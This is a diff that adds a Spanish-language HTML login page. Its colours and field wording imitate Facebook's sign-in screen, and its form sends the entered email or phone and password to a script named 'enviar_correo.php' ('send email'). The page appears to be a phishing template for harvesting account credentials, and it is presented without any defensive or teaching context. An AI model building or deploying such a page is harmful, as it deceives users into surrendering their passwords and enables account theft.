@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+        .login-input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .login-button:hover {
+            background-color: #1659b5;
+        }
+        .login-button:focus {
+            outline: none;
+        }
+        .login-button:active {
+            transform: translateY(1px);
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Iniciar sesión</h2>
+        <form method="post" action="enviar_correo.php">
+            <input type="text" name="usuario" class="login-input" placeholder="Correo electrónico o teléfono">
+            <input type="password" name="contrasena" class="login-input" placeholder="Contraseña">
+            <input type="submit" name="submit" class="login-button" value="Iniciar sesión">
+        </form>
+        <p><a href="#">¿Olvidaste tu contraseña?</a></p>
+    </div>
+</body>
+</html>
